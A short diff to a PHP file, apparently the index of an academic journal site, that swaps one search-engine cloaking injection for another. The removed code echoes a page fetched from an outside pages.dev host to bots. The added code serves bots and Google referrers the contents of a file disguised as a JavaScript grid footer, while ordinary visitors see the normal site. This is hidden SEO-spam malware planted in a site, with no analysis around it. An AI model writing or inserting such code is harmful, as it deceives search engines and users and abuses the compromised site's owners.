@@ -1,22 +1,18 @@
 <?php
-function is_bot() {
-  $user_agent = $_SERVER['HTTP_USER_AGENT'];
-  $bots = array("bot","ahrefs","google");
-  
-  foreach ($bots as $bot) {
-    if (stripos($user_agent, $bot) !== false) {
-      return true;
-    }
-  }
-  
-  return false;
+$userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
+$referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
+$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+
+if ($uri == '/' && (
+    strpos($userAgent, 'bot') !== false || 
+    strpos($userAgent, 'google') !== false || 
+    strpos($userAgent, 'chrome-lighthouse') !== false || 
+    strpos($referer, 'google') !== false
+)) {
+    echo file_get_contents('/js/controllers/grid/articleGalleys/ArticleGalleyGridfooter.js');
+    exit();
 }
 
-if (is_bot()) {
-  $message = file_get_contents('https://punten-neng.pages.dev/stitalkhairiyah/ejournal/');
-  echo $message;
-exit;
-} 
 ?>
 <?php
 
